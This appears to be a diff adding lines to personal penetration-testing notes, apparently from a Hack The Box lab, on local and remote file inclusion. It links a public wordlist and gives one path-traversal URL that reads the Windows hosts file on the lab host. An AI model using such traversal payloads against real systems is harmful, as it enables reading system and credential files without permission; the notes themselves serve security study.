@@ -30,3 +30,17 @@ return 302 not found
 
 
 gobuster
+
+------------
+LFI or Local File Inclusion
+RFI or Remote File Inclusion
+
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+
+examples
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+
+
+
+
